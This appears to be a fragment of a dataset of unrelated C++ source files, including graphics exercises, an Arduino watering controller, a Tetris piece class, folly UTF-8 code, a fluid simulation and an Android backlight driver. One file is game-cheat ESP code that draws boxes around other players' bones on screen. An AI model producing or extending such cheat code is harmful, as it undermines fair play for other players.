\u2193\u63cf\u753b\u51e6\u7406\u3053\u3053\u304b\u3089\n\t\t///\n\n\t\tDrawGrit(worldViewProjectionMatrix, viewportMatrix);\n\n\t\tDrawCatmullRom(controlPoints[0], controlPoints[1], controlPoints[2], controlPoints[3],\n\t\t\tworldViewProjectionMatrix, viewportMatrix, BLUE);\n\n\t\tSphere sphere0 = {\n\tcontrolPoints[0],\n\tradius\n\t\t};\n\t\tSphere sphere1 = {\n\t\tcontrolPoints[1],\n\t\tradius\n\t\t};\n\t\tSphere sphere2 = {\n\t\tcontrolPoints[2],\n\t\tradius\n\t\t};\n\t\tSphere sphere3 = {\n\t\tcontrolPoints[3],\n\t\tradius\n\t\t};\n\n\t\tDrawSphere(sphere0, worldViewProjectionMatrix, viewportMatrix, BLACK);\n\t\tDrawSphere(sphere1, worldViewProjectionMatrix, viewportMatrix, BLACK);\n\t\tDrawSphere(sphere2, worldViewProjectionMatrix, viewportMatrix, BLACK);\n\t\tDrawSphere(sphere3, worldViewProjectionMatrix, viewportMatrix, BLACK);\n\n\n\t\t///\n\t\t/// \u2191\u63cf\u753b\u51e6\u7406\u3053\u3053\u307e\u3067\n\t\t///\n\n\t\t// \u30d5\u30ec\u30fc\u30e0\u306e\u7d42\u4e86\n\t\tNovice::EndFrame();\n\n\t\t// ESC\u30ad\u30fc\u304c\u62bc\u3055\u308c\u305f\u3089\u30eb\u30fc\u30d7\u3092\u629c\u3051\u308b\n\t\tif (preKeys[DIK_ESCAPE] == 0 && keys[DIK_ESCAPE] != 0) {\n\t\t\tbreak;\n\t\t}\n\t}\n\n\t// \u30e9\u30a4\u30d6\u30e9\u30ea\u306e\u7d42\u4e86\n\tNovice::Finalize();\n\treturn 0;\n}\n\n//\u7a4d\nMatrix4x4 MatrixMultiply(const Matrix4x4& m1, const Matrix4x4& m2) {\n\tMatrix4x4 result;\n\n\tresult.m[0][0] = m1.m[0][0] * m2.",
    "#include \"..\\includes.hpp\"\n\nnamespace Cheats\n{\nnamespace ESP\n{\nunsigned int Bone_Middle[5], Bone_Right_Arm[5], Bone_Left_Arm[5], Bone_Right_Leg[5], Bone_Left_Leg[5];\n\nenum EAlignSide : uint8_t\n{\n    SIDE_LEFT = 0U,\n    SIDE_TOP,\n    SIDE_RIGHT,\n    SIDE_BOTTOM,\n    SIDE_MAX\n};\n\nstruct CBox\n{\n    vec4_t bb;\n    Vec2 points[8];\n    float centerX, centerY;\n};\n\nvoid GetEntityBoundingBox(centity_s *entity, vec3_t &vMin, vec3_t &vMax)\n{\n    vec3_t pos;\n    bool firstBone = true;\n\n    auto updateBoundingBox = [&](const vec3_t &bonePos) {\n        if (firstBone)\n        {\n            VectorCopy(bonePos, vMin);\n            VectorCopy(bonePos, vMax);\n\n            firstBone = false;\n        }\n        else\n        {\n            vMin[0] = std::min(vMin[0], bonePos[0]);\n            vMin[1] = std::min(vMin[1], bonePos[1]);\n            vMin[2] = std::min(vMin[2], bonePos[2]);\n\n            vMax[0] = std::max(vMax[0], bonePos[0]);\n            vMax[1] = std::max(vMax[1], bonePos[1]);\n            vMax[2] = std::max(vMax[2], bonePos[2]);\n        }\n    };\n\n    for (int i = 0; i < 5; ++i)\n    {\n        Engine::GetTagPos(entity, Bone_Middle[i], pos);\n        updateBoundingBox(pos);\n\n        Engine::GetTagPos(entity, Bone_Right_Arm[i], pos);\n        updateBoundingBox(pos);\n\n        Engine::GetTagPos(entity, Bone_Left_Arm[i], pos);\n        updateBoundingBox(pos);\n\n        Engine::GetTagPos(entity, Bone_Right_Leg[i], pos);\n        updateBoundingBox(pos);\n\n        Engine::GetTagPos(entity, Bone_Left_Leg[i], pos);\n        updateBoundingBox(pos);\n    }\n}\n\nbool GetEntityBox(centity_s *entity, CBox &bbox)\n{\n    vec3_t min, max;\n    GetEntityBoundingBox(entity, min, max);\n\n    vec3_t origin;\n    VectorCopy(entity->vOrigin, origin);\n\n    vec3_t corners[8];\n    VectorCopy(min, corners[0]);\n    VectorSet(corners[1], max[0], min[1], min[2]);\n    VectorSet(corners[2], min[0], max[1], min[2]);\n    VectorSet(corners[3], max[0], max[1], min[2]);\n    VectorSet(corners[4], min[0], min[1], max[2]);\n    VectorSet(corners[5], max[0], min[1], max[2]);\n    VectorSet(corners[6], min[0], max[1], max[2]);\n    VectorCopy(max, corners[7]);\n\n    // Rotate the corners based on entity angles\n    for (int i = 0; i < 8; ++i)\n    {\n        // We have to obtain the relative pos since GetEntityBoundingBox returns absolute positions.\n        vec3_t relativePos;\n        relativePos[0] = corners[i][0] - origin[0];\n        relativePos[1] = corners[i][1] - origin[1];\n        relativePos[2] = corners[i][2] - origin[2];\n\n        Math::Rotate2D(relativePos, entity->vAngles[YAW]);\n\n        corners[i][0] = relativePos[0] + origin[0];\n        corners[i][1] = relativePos[1] + origin[1];\n        corners[i][2] = relativePos[2] + origin[2];\n    }\n\n    vec2_t screenCorners[8];\n    for (int i = 0; i < 8; ++i)\n    {\n        if (!Math::WorldToScreen(corners[i], screenCorners[i]))\n        {\n            return false;\n        }\n    }\n\n    bbox.bb[SIDE_LEFT] = FLT_MAX;\n    bbox.bb[SIDE_TOP] = FLT_MAX;\n    bbox.bb[SIDE_RIGHT] = -FLT_MAX;\n    bbox.bb[SIDE_BOTTOM] = -FLT_MAX;\n\n    for (int i = 0; i < 8; ++i)\n    {\n        bbox.bb[SIDE_LEFT] = std::min(bbox.bb[SIDE_LEFT], screenCorners[i][0]);\n        bbox.bb[SIDE_TOP] = std::min(bbox.bb[SIDE_TOP], screenCorners[i][1]);\n        bbox.bb[SIDE_RIGHT] = std::max(bbox.bb[SIDE_RIGHT], screenCorners[i][0]);\n        bbox.bb[SIDE_BOTTOM] = std::max(bbox.bb[SIDE_BOTTOM], screenCorners[i][1]);\n    }\n\n    bbox.centerX = bbox.bb[SIDE_LEFT] + ((bbox.bb[SIDE_RIGHT] - bbox.bb[SIDE_LEFT]) / 2.f);\n    bbox.centerY = bbox.bb[SIDE_TOP] + ((bbox.bb[SIDE_BOTTOM] - bbox.bb[SIDE_TOP]) / 2.f);\n\n    memcpy(&bbox.points, screenCorners, sizeof(screenCorners));\n\n    return true;\n}\n\nvoid DrawBoundingBox3D(CBox &bbox, const Color &color)\n{\n    // Draw bottom face\n    g_renderer->AddLine(g_drawList, Vec2(bbox.points[0].x, bbox.points[0].y), Vec2(bbox.points[1].x, bbox.points[1].y),\n                        color, 2.f);\n    g_renderer->AddLine(g_drawList, Vec2(bbox.points[1].x, bbox.points[1].y), Vec2(bbox.points[3].x, bbox.points[3].y),\n                        color, 2.f);\n    g_renderer->AddLine(g_drawList, Vec2(bbox.points[3].x, bbox.points[3].y), Vec2(bbox.points[2].x, bbox.points[2].y),\n                        color, 2.f);\n    g_renderer->AddLine(g_drawList, Vec2(bbox.points[2].x, bbox.points[2].y), Vec2(bbox.points[0].x, bbox.points[0].y),\n                        color, 2.f);\n\n    // Draw top face\n    g_renderer->AddLine(g_drawList, Vec2(bbox.points[4].x, bbox.points[4].y), Vec2(bbox.points[5].x, bbox.points[5].y),\n                        color, 2.f);\n    g_renderer->AddLine(g_drawList, Vec2(bbox.points[5].x, bbox.points[5].y), Vec2(bbox.points[7].x, bbox.points[7].y),\n                        color, 2.f);\n    g_renderer->AddLine(g_drawList, Vec2(bbox.points[7].x, bbox.points[7].y), Vec2(bbox.points[6].x, bbox.points[6].y),\n                        color, 2.f);\n    g_renderer->AddLine(g_drawList, Vec2(bbox.points[6].x, bbox.points[6].y), Vec2(bbox.points[4].x, bbox.points[4",
    "#include \"DeviceManager.h\"\n\n\nDeviceManager::DeviceManager(Configuracion& conf) : Manager(conf){\n  this->currentMode = RUTINE_MODE;\n  this->lastInteraction = -1; // Cuando despierta el dispositivo, si no hubo ningun mensage lo indico con un time_t negativo\n  this->deviceDisplay = Display();\n  \n};\n\nvoid DeviceManager::setupPines(){\n  // LED\n  pinMode(PIN_LED,OUTPUT);\n  digitalWrite(PIN_LED, LOW);// HIGH - LOW\n\n  // DISPLAY\n  pinMode(PIN_DISPLAY,OUTPUT);\n  digitalWrite(PIN_DISPLAY,LOW);\n\n  //BOMBA AGUA\n  pinMode(PIN_AGUA,OUTPUT);\n  digitalWrite(PIN_AGUA, LOW);// HIGH - LOW\n\n}\n\n// SETUP\nvoid DeviceManager::handleSetup(){\n  setupPines();\n  displayStatus();\n  \n\n}\n\n// RUTINE JOB\nvoid DeviceManager::handleRutineJob() {\n  long nextEventTime = timeUntilNextEvent();\n  updateDeviceMode();\n  Serial.println(\" --- Device is Working ---\\n\");\n  evaluateAndEnterDeepSleep();\n}\n\nvoid DeviceManager::displayStatus(){\n  digitalWrite(PIN_DISPLAY,HIGH);\n  deviceDisplay.displayText(\"HOLAMUNDO\");\n  delay(5000);\n  digitalWrite(PIN_DISPLAY,LOW);\n}\n\nvoid DeviceManager::displayText(String text){\n  digitalWrite(PIN_DISPLAY,HIGH);\n  deviceDisplay.displayText(text);\n  delay(5000);\n  digitalWrite(PIN_DISPLAY,LOW);\n}\n\nvoid DeviceManager::evaluateAndEnterDeepSleep(){\n\n//  long timeNextEvent = timeUntilNextEvent();\n  long ne = timeUntilNextEvent();               // ---\n  long wui = DeviceManager::WAKE_UP_INTERVAL;   // ___\n  long of = DeviceManager::OFFSET;             // ooo\n  Serial.print(\" --- Segundo para el siguiente Evento: \");Serial.print(ne);Serial.println(\" ---\");\n  switch(currentMode){\n    case RUTINE_MODE:\n        //  ______________\n        //  -----------------oooo\n        if(ne + of - wui > of){\n          deepSleep();\n        }\n       //  ______________\n       //  -------------oooo\n        else if( (ne + of > wui) && (ne + of - wui < of) ){\n//          deepSleep(ne - of); Elejir\n          lightSleep(ne);\n          regar();\n          if(conf.getAreNotificationsOn()){\n            notifyObservers(\"Evento Activado: Ya regamos  tu Planta :)\");// OPCIONAL -> TODO CAMBIAR MENSAGE\n          }\n          \n        }\n        //  ______________\n        //  ---------oooo\n        else if( ne + of < wui ){\n          lightSleep(ne);\n          regar();\n          if(conf.getAreNotificationsOn()){\n            notifyObservers(\"Evento Activado: Ya regamos  tu Planta :)\");// OPCIONAL -> TODO CAMBIAR MENSAGE\n          }\n        }\n      break;\n\n    case CHAT_MODE:\n      if(ne < wui){\n        lightSleep(ne);\n        regar();\n        if(conf.getAreNotificationsOn()){\n            notifyObservers(\"Evento Activado: Ya regamos  tu Planta :)\");// OPCIONAL -> TODO CAMBIAR MENSAGE\n        }\n      }\n      else{\n//        lightSleep(3);\n      }\n      Serial.println(\" --- ChatMode: no sleep ---\");\n      break; \n  }\n}\n\n\nvoid DeviceManager::addObserver(Observer* o){\n  this->observador = o;\n}\nvoid DeviceManager::removeObserver(){\n  this->observador = 0;\n}\nvoid DeviceManager::notifyObservers(String msg){\n  Serial.println(\" --- avisando a los observadores... ---\");\n  this->observador->notify(msg);\n}\n\nvoid DeviceManager::updateDeviceMode(){\n  \n  time_t now = time(NULL);\n  \n  switch(this->currentMode){\n\n    case RUTINE_MODE:\n      // Check If there was any Message\n      if( lastInteraction > 0 ){ // se produjo un mensaje\n        currentMode = CHAT_MODE;\n      }\n      break;\n\n    case CHAT_MODE:\n      if(difftime(now,lastInteraction) > DeviceManager::AWAKE_TOLERANCE){\n        Serial.println(\" --- Awake tolerance achived, going to sleep ---\");\n        currentMode = RUTINE_MODE;\n        notifyObservers(\"Bueno me voy a dormir... cualquier cosa escribime :)\");\n      }\n      break;\n  }\n}\n\nvoid DeviceManager::UpdateLastInteraction(){\n  this->lastInteraction = time(NULL);\n}\n\nvoid DeviceManager::showMsg(String msg){}\nvoid DeviceManager::showQR(String url){}\n\nvoid DeviceManager::regar(){\n  digitalWrite(PIN_LED,HIGH);\n  digitalWrite(PIN_AGUA,HIGH);\n  displayText(\"Regando...\");\n  delay(5000);\n  digitalWrite(PIN_AGUA,LOW);\n  digitalWrite(PIN_LED,LOW);\n};\n//Suponer: 100mliliLitros == 100miliSeg, Despues hay que fijarse posta\nvoid DeviceManager::regarCant(int miliLitros){\n  digitalWrite(PIN_LED,HIGH);\n  delay(miliLitros);\n  digitalWrite(PIN_LED,LOW);\n}\n\nvoid DeviceManager::prenderLed(){}\nvoid DeviceManager::apagarLed(){}\n\n//void  DeviceManager::setBotManager(BotManager* botManager){\n//  this->botManager = botManager;\n//}\n\nString DeviceManager::getSensorsInfo(){} // Para el futuro\n\nlong DeviceManager::timeUntilNextEvent(){\n\n  long tiempos[Configuracion::CANT_EVENTOS];\n  for(int i=0; i<Configuracion::CANT_EVENTOS; i++){\n    tiempos[i] = (conf.getEvento(i))->cuantoFalta();\n  }\n  long tiempoMenor = 92233720368547758;// nuemro muy grande\n  for(int i=0;i<Configuracion::CANT_EVENTOS; i++){\n//    Serial.print(\"Tiempo restante \");Serial.print(i);Serial.print(\": \"); Serial.println(tiempos[i]);\n    if(tiempos[i] < tiempoMenor){\n      \n      tiempoMenor = tiempos[i];\n\n//      Serial.print(\"\\n Tiempo c",
    "#include \"piece.hpp\"\n#include <array>\n#include <map>\n#include <stdlib.h>\n#include <vector>\n\nPiece::Piece()\n    : position(std::make_pair(0, 0)),\n      pieceGrid(std::array<std::array<bool, 3>, 3>{\n          std::array<bool, 3>{false, false, false},\n          std::array<bool, 3>{false, false, false},\n          std::array<bool, 3>{false, false, false}}) {\n  std::vector<std::array<std::array<bool, 3>, 3>> choices = {\n      std::array<std::array<bool, 3>, 3>{\n          std::array<bool, 3>{false, true, false},\n          std::array<bool, 3>{false, true, false},\n          std::array<bool, 3>{false, true, false}},\n      std::array<std::array<bool, 3>, 3>{\n          std::array<bool, 3>{false, true, false},\n          std::array<bool, 3>{false, true, false},\n          std::array<bool, 3>{true, true, false}},\n      std::array<std::array<bool, 3>, 3>{\n          std::array<bool, 3>{false, true, false},\n          std::array<bool, 3>{false, true, false},\n          std::array<bool, 3>{false, true, true}},\n      std::array<std::array<bool, 3>, 3>{\n          std::array<bool, 3>{false, false, false},\n          std::array<bool, 3>{false, true, true},\n          std::array<bool, 3>{false, true, true}},\n      std::array<std::array<bool, 3>, 3>{\n          std::array<bool, 3>{false, true, true},\n          std::array<bool, 3>{true, true, false},\n          std::array<bool, 3>{false, false, false}},\n      std::array<std::array<bool, 3>, 3>{\n          std::array<bool, 3>{true, true, true},\n          std::array<bool, 3>{false, true, false},\n          std::array<bool, 3>{false, false, false}},\n      std::array<std::array<bool, 3>, 3>{\n          std::array<bool, 3>{true, true, false},\n          std::array<bool, 3>{false, true, true},\n          std::array<bool, 3>{false, false, false}}};\n\n  PieceGrid pg(choices[rand() % choices.size()]);\n\n  pieceGrid = pg;\n  position.first = -getUpperPoints()[0].first;\n  position.second = 3;\n}\n\nPiece::~Piece() {}\n\nvoid Piece::rotate(int rotation) { pieceGrid.rotate(rotation); }\n\nvoid Piece::offset(char c) {\n  // map the chars to offsets\n  std::map<char, std::pair<int, int>> offsetVals = {\n      {'u', {-1, 0}}, {'d', {1, 0}}, {'l', {0, -1}}, {'r', {0, 1}}};\n\n  // update the position\n  // This op should not be done unless the move is possible,\n  // this is verified in the game level.\n  position.first += offsetVals[c].first;\n  position.second += offsetVals[c].second;\n\n  return;\n}\n\nstd::vector<std::pair<int, int>> Piece::getCases() {\n  std::vector<std::pair<int, int>> pieces;\n  for (int i = 0; i < 3; i++) {\n    for (int j = 0; j < 3; j++) {\n      if (pieceGrid.getGrid()[i][j]) {\n        pieces.push_back({i + position.first, j + position.second});\n      }\n    }\n  }\n\n  return pieces;\n}\n\nstd::vector<std::pair<int, int>> Piece::getLowerPoints() {\n  std::vector<std::pair<int, int>> lowerPointsCoords;\n\n  for (int i = 2; i >= 0; i--) {\n    bool found = false;\n    for (int j = 0; j < 3; j++) {\n      if (pieceGrid.getGrid()[i][j]) {\n        found = true;\n        lowerPointsCoords.push_back({i + position.first, j + position.second});\n      }\n    }\n\n    if (found) {\n      break;\n    }\n  }\n\n  return lowerPointsCoords;\n}\n\nstd::vector<std::pair<int, int>> Piece::getUpperPoints() {\n  std::vector<std::pair<int, int>> upperPointsCoords;\n\n  for (int i = 0; i < 3; i++) {\n    bool found = false;\n    for (int j = 0; j < 3; j++) {\n      if (pieceGrid.getGrid()[i][j]) {\n        found = true;\n        upperPointsCoords.push_back({i + position.first, j + position.second});\n      }\n    }\n\n    if (found) {\n      break;\n    }\n  }\n\n  return upperPointsCoords;\n}\n\nstd::vector<std::pair<int, int>> Piece::getRightmostPoints() {\n  std::vector<std::pair<int, int>> rightmostPointsCoords;\n\n  for (int j = 2; j >= 0; j--) {\n    bool found = false;\n    for (int i = 0; i < 3; i++) {\n      if (pieceGrid.getGrid()[i][j]) {\n        found = true;\n        rightmostPointsCoords.push_back(\n            {i + position.first, j + position.second});\n      }\n    }\n\n    if (found) {\n      break;\n    }\n  }\n\n  return rightmostPointsCoords;\n}\n\nstd::vector<std::pair<int, int>> Piece::getLeftmostPoints() {\n  std::vector<std::pair<int, int>> leftmostPointsCoords;\n\n  for (int j = 0; j < 3; j++) {\n    bool found = false;\n    for (int i = 0; i < 3; i++) {\n      if (pieceGrid.getGrid()[i][j]) {\n        found = true;\n        leftmostPointsCoords.push_back(\n            {i + position.first, j + position.second});\n      }\n    }\n\n    if (found) {\n      break;\n    }\n  }\n\n  return leftmostPointsCoords;\n}\n\nvoid Piece::setPieceGrid(PieceGrid pg) { pieceGrid = pg; }\n\nvoid Piece::setPosition(std::pair<int, int> newPos) { position = newPos; }\n\nstd::pair<int, int> Piece::getPosition() { return position; }\n",
    "/*\n * Copyright (c) Meta Platforms, Inc. and affiliates.\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *     http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\n#include <folly/Unicode.h>\n\n#include <initializer_list>\n\n#include <folly/Conv.h>\n\nnamespace folly {\n\nnamespace {\n\ntemplate <class F>\nvoid codePointToUtf8Impl(char32_t cp, F&& f) {\n  // Based on description from http://en.wikipedia.org/wiki/UTF-8.\n\n  if (cp <= 0x7f) {\n    f({\n        static_cast<char>(cp),\n    });\n  } else if (cp <= 0x7FF) {\n    f({\n        static_cast<char>(0xC0 | (cp >> 6)),\n        static_cast<char>(0x80 | (0x3f & cp)),\n    });\n  } else if (cp <= 0xFFFF) {\n    f({\n        static_cast<char>(0xE0 | (cp >> 12)),\n        static_cast<char>(0x80 | (0x3f & (cp >> 6))),\n        static_cast<char>(0x80 | (0x3f & cp)),\n    });\n  } else if (cp <= 0x10FFFF) {\n    f({\n        static_cast<char>(0xF0 | (cp >> 18)),\n        static_cast<char>(0x80 | (0x3f & (cp >> 12))),\n        static_cast<char>(0x80 | (0x3f & (cp >> 6))),\n        static_cast<char>(0x80 | (0x3f & cp)),\n    });\n  }\n}\n\n} // namespace\n\nstd::string codePointToUtf8(char32_t cp) {\n  std::string result;\n  codePointToUtf8Impl(cp, [&](std::initializer_list<char> data) {\n    result.assign(data.begin(), data.end());\n  });\n  return result;\n}\n\nvoid appendCodePointToUtf8(char32_t cp, std::string& out) {\n  codePointToUtf8Impl(cp, [&](std::initializer_list<char> data) {\n    out.append(data.begin(), data.end());\n  });\n}\n\nchar32_t utf8ToCodePoint(\n    const unsigned char*& p, const unsigned char* const e, bool skipOnError) {\n  // clang-format off\n  /** UTF encodings\n  *  | # of B | First CP |  Last CP  | Bit Pattern\n  *  |   1    |   0x0000 |   0x007F  | 0xxxxxxx\n  *  |   2    |   0x0080 |   0x07FF  | 110xxxxx 10xxxxxx\n  *  |   3    |   0x0800 |   0xFFFF  | 1110xxxx 10xxxxxx 10xxxxxx\n  *  |   4    |  0x10000 | 0x10FFFF  | 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx\n  *  |   5    |       -  |        -  | 111110xx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx\n  *  |   6    |       -  |        -  | 1111110x 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx\n  *\n  *\n  * NOTE:\n  * - the 4B encoding can encode values up to 0x1FFFFF,\n  *   but Unicode defines 0x10FFFF to be the largest code point\n  * - the 5B & 6B encodings will all encode values larger than 0x1FFFFF\n  *   (so larger than the largest code point value 0x10FFFF) so they form invalid\n  *   Unicode code points\n  *\n  * On invalid input (invalid encoding or code points larger than 0x10FFFF):\n  * - When skipOnError is true, this function will skip the first byte and return\n  *   U'\\ufffd'. Potential optimization: skip the whole invalid range.\n  * - When skipOnError is false, throws.\n  */\n  // clang-format on\n\n  const auto skip = [&] {\n    ++p;\n    return U'\\ufffd';\n  };\n\n  if (p >= e) {\n    if (skipOnError) {\n      return skip();\n    }\n    throw std::runtime_error(\"folly::utf8ToCodePoint empty/invalid string\");\n  }\n\n  unsigned char fst = *p;\n  if (!(fst & 0x80)) {\n    // trivial case, 1 byte encoding\n    return *p++;\n  }\n\n  static const uint32_t bitMask[] = {\n      (1 << 7) - 1,\n      (1 << 11) - 1,\n      (1 << 16) - 1,\n      (1 << 21) - 1,\n  };\n\n  // upper control bits are masked out later\n  uint32_t d = fst;\n\n  // multi-byte encoded values must start with bits 0b11. 0xC0 is 0b11000000\n  if ((fst & 0xC0) != 0xC0) {\n    if (skipOnError) {\n      return skip();\n    }\n    throw std::runtime_error(\n        to<std::string>(\"folly::utf8ToCodePoint i=0 d=\", d));\n  }\n\n  fst <<= 1;\n\n  for (unsigned int i = 1; i != 4 && p + i < e; ++i) {\n    const unsigned char tmp = p[i];\n\n    // from the second byte on, format should be 10xxxxxx\n    if ((tmp & 0xC0) != 0x80) {\n      if (skipOnError) {\n        return skip();\n      }\n      throw std::runtime_error(to<std::string>(\n          \"folly::utf8ToCodePoint i=\", i, \" tmp=\", (uint32_t)tmp));\n    }\n\n    // gradually fill a 32 bit integer d with non control bits in tmp\n    // 0x3F is 0b00111111 which clears out the first 2 control bits\n    d = (d << 6) | (tmp & 0x3F);\n    fst <<= 1;\n\n    if (!(fst & 0x80)) {\n      // We know the length of encoding now, since we encounter the first \"0\" in\n      // fst (the first byte). This branch processes the last byte of encoding.\n      d &= bitMask[i]; // d is now the code point\n\n      // overlong, could have been encoded with i bytes\n      if ((d & ~bitMask[i - 1]) == 0) {\n        if (skipOnError) {\n          return skip();\n        }\n        throw std::runtime_error(\n            to<std::string>(\"folly::utf8ToCodePoint i=\", i, \" d=\", d));\n      }\n\n      /",
    "// #pragma once\n\n#include <array>\n#include <cinttypes>\n#include <stdfloat>\n#include <iostream>\n#include <vector>\n#include <numeric>\n#include <chrono>\n\n\nenum class VelSet {D2Q9, D3Q19};\n\n\nconstexpr VelSet vel_set_use = VelSet::D2Q9;\n\ntemplate<bool>\nstruct always_false : std::false_type {};\n\ntemplate<VelSet V>\nconstexpr std::size_t GetDim() {\n\n    if constexpr (V == VelSet::D2Q9) {\n        return 2;\n    } else if constexpr (V == VelSet::D3Q19) {\n        return 3;\n    } else {\n        static_assert(always_false<true>::value, \"Unsupported VelSet\");\n    }\n\n    //Static assert n\u00e3o funciona com o if constexpr sem usar template\n}\n\ntemplate<VelSet V>\nconstexpr std::size_t GetPop() {\n    if constexpr (V == VelSet::D2Q9) {\n        return 9;\n    } else if constexpr(V == VelSet::D3Q19) {\n        return 19;\n    } else {\n        static_assert(always_false<true>::value, \"Unsupported VelSet\");\n    }\n    //Static assert n\u00e3o funciona com o if constexpr sem usar template\n}\n\nconstexpr std::size_t dim = GetDim<vel_set_use>();\nconstexpr std::size_t n_pop = GetPop<vel_set_use>();\n\n// example with lambda\n// constexpr auto pop_dir = [] {\n//     if constexpr (vel_set_use == VelSet::D2Q9) {\n//         return std::array<std::array<std::int32_t, dim>, n_pop> {{\n//             {{0, 0}}, {{1, 0}}, {{0, 1}}, {{-1, 0}}, {{0, -1}},\n//             {{1, 1}}, {{-1, 1}}, {{-1, -1}}, {{1, -1}}\n//         }};\n//     } \n// }();\n\n// constexpr auto pop_weights = [] {\n//     if constexpr (vel_set_use == VelSet::D2Q9) {\n//         return std::array<float, n_pop>{\n//             4.0f / 9.0f, 1.0f / 9.0f, 1.0f / 9.0f, 1.0f / 9.0f, 1.0f / 9.0f,\n//             1.0f / 36.0f, 1.0f / 36.0f, 1.0f / 36.0f, 1.0f / 36.0f\n//         };\n//     }\n// }();\n\ntemplate<typename T>\nconstexpr auto GetPopDir() {\n    if constexpr(vel_set_use == VelSet::D2Q9) {\n        return std::array<std::array<T, dim>, n_pop> {{\n            {0, 0}, {1, 0}, {0, 1}, {-1, 0}, {0, -1},\n            {1, 1}, {-1, 1}, {-1, -1}, {1, -1}\n        }};\n    } \n}\n\ntemplate<typename T>\nconstexpr auto GetPopWeights() {\n    if constexpr(vel_set_use == VelSet::D2Q9) {\n        return std::array<T, n_pop>{\n            4.0f / 9.0f, 1.0f / 9.0f, 1.0f / 9.0f, 1.0f / 9.0f, 1.0f / 9.0f,\n            1.0f / 36.0f, 1.0f / 36.0f, 1.0f / 36.0f, 1.0f / 36.0f\n        };\n    } \n}\n\n//em 89 std::float32_t n\u00e3o funciona quando tenho que definir template do array ...\n\nconstexpr auto pop_dir = GetPopDir<std::int8_t>();\nconstexpr auto pop_weights = GetPopWeights<float>();\n\nconstexpr std::float32_t cs2 = 1.0 / 3.0;\nconstexpr std::float32_t tau = 0.9;\n\nconstexpr std::array<std::uint32_t, dim> domain_size = {32, 32};\nconstexpr std::uint32_t array_size = domain_size[0] * domain_size[1] * (dim == 2 ? 1 : domain_size[2]);\n\n// o idx em zig \u00e9 usize, que pode n\u00e3o ser necessariamente um uint64\n// ESSA n\u00e3o funciona essa fun\u00e7\u00e3o, o compilador n\u00e3o consegue definir o valor de saida\n// ai o dim \u00e9 ajustado, mas o if n\u00e3o consegue fazer com que \n// constexpr std::array<std::uint32_t, dim> idx2pos(std::uint32_t idx) {\n    \n//     #if vel_set_use == VelSet::D2Q9\n//         return {idx % domain_size[0], idx / domain_size[0]};\n//     # else\n//         return { idx % domain_size[0], (idx / domain_size[0]) % domain_size[1], idx / (domain_size[0] * domain_size[1]) };\n//     #endif\n// }\n\nconstexpr auto idx2pos(std::uint32_t idx) {\n    // constexpr std::int32_t converted_idx = static_cast<std::int32_t>(idx);\n    if constexpr (dim == 2) {\n        return std::array<std::int32_t, 2>{\n            static_cast<std::int32_t>(idx % domain_size[0]), \n            static_cast<std::int32_t>(idx / domain_size[0])\n        };\n    } else {\n        return std::array<std::int32_t, 3>{ \n            static_cast<std::int32_t>(idx % domain_size[0]), \n            static_cast<std::int32_t>((idx / domain_size[0]) % domain_size[1]), \n            static_cast<std::int32_t>(idx / (domain_size[0] * domain_size[1])) \n        };\n    }\n}\n\ntemplate<typename T>\nconstexpr T pos2idx(std::array<T, dim> pos) {\n    if constexpr (dim == 2) {\n        return pos[0] + pos[1] * domain_size[0];\n    } else {\n        return pos[0] + domain_size[0] * (pos[1] + pos[2] * domain_size[1]);\n    }\n}\n\nstd::uint32_t idxPop(std::array<std::int32_t, dim> pos, std::uint32_t i) {\n    return (pos2idx(pos)) * i;\n}\n\n// template<typename T>\n// T DotProd(T& x, T& y) {\n    \n//     return std::inner_product(x.begin(), x.end(), y.begin(), static_cast<T>(0));\n// }\n\n\nstd::float32_t DotProd(const std::array<std::float32_t, dim>& x,  const std::array<std::int8_t, dim>& y) {\n\n    return std::inner_product(x.begin(), x.end(), y.begin(), static_cast<std::float32_t>(0));\n}\n\nstd::float32_t FuncFeq(std::float32_t rho, std::array<std::float32_t, dim>& u, std::uint32_t i) {\n    const std::float32_t uc = DotProd(u, pop_dir[i]);\n    const std::float32_t uu = DotProd(u, pop_dir[i]);\n\n    return rho * pop_weights[i] * (1 + uc / cs2 + (uc * uc) / (2 * cs2 * cs2) - (uu) / (2 * cs2));\n\n}\n\nvoid Macroscopics (\n    std::vector<std::float32_t>& p",
    "/*\n * Copyright (C) 2019-2021 The LineageOS Project\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\n#include \"livedisplay/sysfs/AdaptiveBacklight.h\"\n\n#include <android-base/file.h>\n#include <android-base/strings.h>\n\nusing ::android::base::ReadFileToString;\nusing ::android::base::Trim;\nusing ::android::base::WriteStringToFile;\n\nnamespace {\nconstexpr const char* kFileAcl = \"/sys/class/graphics/fb0/acl\";\nconstexpr const char* kFileCabc = \"/sys/class/graphics/fb0/cabc\";\n}  // anonymous namespace\n\nnamespace vendor {\nnamespace lineage {\nnamespace livedisplay {\nnamespace V2_0 {\nnamespace sysfs {\n\nAdaptiveBacklight::AdaptiveBacklight() {\n    if (!access(kFileAcl, R_OK | W_OK)) {\n        file_ = kFileAcl;\n    } else if (!access(kFileCabc, R_OK | W_OK)) {\n        file_ = kFileCabc;\n    } else {\n        file_ = nullptr;\n    }\n}\n\nbool AdaptiveBacklight::isSupported() {\n    return file_ != nullptr;\n}\n\n// Methods from ::vendor::lineage::livedisplay::V2_0::IAdaptiveBacklight follow.\nReturn<bool> AdaptiveBacklight::isEnabled() {\n    std::string tmp;\n    int32_t contents = 0;\n\n    if (ReadFileToString(file_, &tmp)) {\n        contents = std::stoi(Trim(tmp));\n    }\n\n    return contents > 0;\n}\n\nReturn<bool> AdaptiveBacklight::setEnabled(bool enabled) 